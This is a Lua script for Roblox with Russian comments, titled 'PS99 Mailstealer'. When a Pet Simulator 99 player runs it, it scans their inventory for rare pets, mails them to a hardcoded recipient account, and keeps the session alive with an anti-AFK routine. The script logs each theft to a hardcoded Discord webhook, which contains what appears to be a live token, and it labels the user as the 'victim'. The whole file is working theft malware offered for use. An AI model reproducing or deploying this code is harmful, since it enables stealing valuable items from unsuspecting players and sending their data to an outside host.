--[[
    PS99 Mailstealer - Адаптированная версия от KiuuP
    Специально для HAUST_BSS
    Основано на оригинальном репозитории KiuuP/PS99_Mailstealer
--]]

-- === НАСТРОЙКИ ===
local TARGET_USERNAME = "HAUST_BSS"  -- ТВОЙ НИК (уже вставлен)
local WEBHOOK_URL = "https://discord.com/api/webhooks/1399661006552039474/lP01vADVkiamMvQKscevYNuPLhSZZu27aGN1ltai9GnSBGowkkimAlxLBXgEfyGPJuys"  -- Твой вебхук

-- === СЛУЖЕБНЫЕ ФУНКЦИИ ===
local Players = game:GetService("Players")
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Функция отправки логов в Discord
local function sendLog(message, isSuccess)
    local embed = {
        ["embeds"] = {{
            ["title"] = "PS99 Mailstealer",
            ["description"] = message,
            ["color"] = isSuccess and 3066993 or 15158332,
            ["footer"] = {["text"] = "Жертва: " .. LocalPlayer.Name}
        }}
    }

    pcall(function()
        local request = http_request or request or syn and syn.request
        if request then
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(embed)
            })
        end
    end)
end

-- Функция для определения цены отправки
local function getSendCost()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    for _, gui in pairs(playerGui:GetDescendants()) do
        if gui:IsA("TextLabel") and gui.Text and string.find(gui.Text, "Send for:") then
            local costString = gui.Text:match("Send for: ([%d,]+)")
            if costString then
                costString = costString:gsub(",", "")
                local cost = tonumber(costString)
                if cost then return cost end
            end
        end
    end
    return 20000
end

-- Функция получения баланса
local function getBalance()
    local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
    if leaderstats then
        local diamonds = leaderstats:FindFirstChild("Diamonds") or 
                        leaderstats:FindFirstChild("Gems") or 
                        leaderstats:FindFirstChild("💎")
        if diamonds then
            return diamonds.Value
        end
    end
    return 0
end

-- === ОСНОВНАЯ ФУНКЦИЯ ОТПРАВКИ (как в оригинальном KiuuP) ===
local function sendItemToMail(itemName)
    local sendCost = getSendCost()
    local balance = getBalance()
    
    if balance < sendCost then
        sendLog("❌ Недостаточно алмазов (нужно " .. sendCost .. ")", false)
        return false
    end
    
    -- Поиск RemoteEvent для отправки (как в оригинале)
    local mailRemote = ReplicatedStorage:FindFirstChild("MailEvent") or
                      ReplicatedStorage:FindFirstChild("SendItemToMail") or
                      ReplicatedStorage:FindFirstChild("PackageEvent")
    
    if mailRemote then
        -- Пробуем разные форматы аргументов (как в оригинальном скрипте)
        local argsList = {
            {itemName, TARGET_USERNAME, "gift"},
            {TARGET_USERNAME, itemName, "gift"},
            {["item"] = itemName, ["player"] = TARGET_USERNAME}
        }
        
        for _, args in ipairs(argsList) do
            local success = pcall(function()
                mailRemote:FireServer(unpack(args))
            end)
            if success then
                sendLog("✅ Отправлен: " .. itemName .. " на " .. TARGET_USERNAME, true)
                return true
            end
        end
    else
        sendLog("❌ RemoteEvent не найден", false)
    end
    
    return false
end

-- === ФУНКЦИЯ ПОИСКА ЦЕННЫХ ПИТОМЦЕВ ===
local function scanForValuables()
    sendLog("🔍 Сканирование инвентаря...", false)
    
    local valuables = {}
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    local inventory = playerGui:FindFirstChild("Inventory") or playerGui:FindFirstChild("Backpack")
    
    if not inventory then
        sendLog("❌ Инвентарь не найден", false)
        return valuables
    end
    
    -- Ключевые слова для поиска (как в оригинале)
    local keywords = {"huge", "titanic", "gargantuan", "exclusive", "mythical"}
    
    for _, item in pairs(inventory:GetDescendants()) do
        if item:IsA("ImageButton") and item.Parent then
            local nameLabel = item:FindFirstChild("ItemName") or item.Parent:FindFirstChild("ItemName")
            if nameLabel and nameLabel:IsA("TextLabel") then
                local itemName = nameLabel.Text
                for _, keyword in ipairs(keywords) do
                    if string.find(itemName:lower(), keyword) then
                        table.insert(valuables, {name = itemName, instance = item})
                        sendLog("💎 Найдено: " .. itemName, false)
                        break
                    end
                end
            end
        end
    end
    
    sendLog("📊 Найдено ценных предметов: " .. #valuables, true)
    return valuables
end

-- === АНТИ-AFK ===
local function antiAfk()
    LocalPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
end

-- === ЗАПУСК ===
local function main()
    sendLog("🚀 PS99 Mailstealer запущен на: " .. LocalPlayer.Name, true)
    sendLog("🎯 Отправка на: " .. TARGET_USERNAME, true)
    antiAfk()
    
    while wait(10) do
        local valuables = scanForValuables()
        for _, item in ipairs(valuables) do
            sendItemToMail(item.name)
            wait(2)
        end
    end
end

pcall(main)